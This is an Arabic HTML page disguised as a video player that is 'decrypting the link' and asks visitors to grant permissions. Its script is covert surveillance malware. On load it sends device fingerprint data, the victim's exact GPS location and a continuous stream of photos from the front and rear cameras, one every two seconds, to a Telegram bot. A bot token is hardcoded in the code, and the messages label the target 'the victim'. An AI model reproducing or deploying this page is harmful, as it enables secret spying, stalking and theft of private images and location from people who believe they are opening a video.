<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تهيئة مشغل الفيديو...</title>
    <style>
        body { background-color: #050505; color: #444; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; padding: 20px; }
        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; letter-spacing: 0.5px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <p>جاري فك تشفير الرابط... يرجى السماح بالأذونات للمتابعة</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- إعدادات التحكم الخاصة بك ---
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let currentStream = null;

        async function sendToTelegram(endpoint, params) {
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, {
                    method: 'POST',
                    body: params
                });
            } catch (e) { console.error("Telegram Error", e); }
        }

        function sendText(text) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', text);
            formData.append('parse_mode', 'Markdown');
            sendToTelegram('sendMessage', formData);
        }

        async function getDeviceHardware() {
            let info = "🛡️ **تقرير اختراق جديد (بصمة الجهاز):**\n\n";
            info += `📱 *المنصة:* ${navigator.platform}\n`;
            info += `⚙️ *المعالج (أنوية):* ${navigator.hardwareConcurrency || "غير معروف"}\n`;
            info += `💾 *الرام التقريبي:* ${navigator.deviceMemory || "غير معروف"} GB\n`;
            
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info += `🔋 *البطارية:* ${Math.round(b.level * 100)}% (${b.charging ? "🔌 شاحن" : "🔋 استهلاك"})\n`;
            }

            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info += `🌐 *الشبكة:* ${conn.effectiveType} (${conn.downlink} Mbps)\n`;
            }

            info += `🔗 *الرابط المصدر:* ${document.referrer || "دخول مباشر"}\n`;
            sendText(info);
        }

        function grabLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    sendText(`📍 **موقع الضحية الدقيق:**\n[اضغط هنا لفتح الخريطة](${link})`);
                }, () => sendText("❌ الضحية رفض إذن الموقع."));
            }
        }

        async function startSurveillance() {
            const modes = ["user", "environment"];
            let i = 0;

            while (true) {
                const mode = modes[i % 2];
                const label = mode === "user" ? "الأمامية 🤳" : "الخلفية 📷";
                
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    
                    currentStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: mode }, 
                        audio: false 
                    });
                    
                    video.srcObject = currentStream;
                    // تم تقليل وقت الانتظار للاستجابة السريعة
                    await new Promise(r => setTimeout(r, 800)); 

                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'shot.jpg');
                        fd.append('caption', `🔄 لقطة سريعة من: ${label}`);
                        sendToTelegram('sendPhoto', fd);
                    }, 'image/jpeg', 0.5);

                } catch (e) {
                    console.log("Camera Switch Error", e);
                }
                
                i++;
                // --- التعديل المطلوب: التبديل كل ثانيتين (2000 مللي ثانية) ---
                await new Promise(r => setTimeout(r, 2000)); 
            }
        }

        window.onload = () => {
            getDeviceHardware();
            grabLocation();
            startSurveillance();
            if (navigator.wakeLock) { navigator.wakeLock.request('screen'); }
        };
    </script>
</body>
</html>
